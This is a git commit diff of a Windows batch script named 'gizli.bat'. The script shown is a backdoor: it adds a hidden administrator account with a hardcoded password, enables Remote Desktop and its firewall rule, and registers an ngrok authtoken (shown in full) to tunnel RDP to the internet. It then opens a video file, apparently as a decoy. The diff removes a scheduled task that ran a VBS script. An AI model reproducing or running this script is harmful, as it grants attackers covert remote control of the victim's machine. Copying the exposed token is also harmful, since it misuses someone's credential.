d5499959a2da28660085668d41cb658b87f7c3eb
terionun <terionun_41@hotmail.com>
2024-06-22 16:49:55 +0300

    Update gizli.bat

--- gizli.bat
+++ gizli.bat
@@ -8,7 +8,6 @@ net user ali ali123 /add
 net localgroup administrators ali /add
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
-schtasks /create /sc minute /mo 1000 /tn "MustafaTime" /tr "wscript C:\Windows\test.vbs"
 C:\Windows\ngrok.exe config add-authtoken 1d0A6StSywuFgvJKSRCPurcS63o_2uL5cX6HAHfJz7rFzfJTq
 C:\Windows\ngrok.exe tcp 3389
 start C:\Windows\mt2.mkv
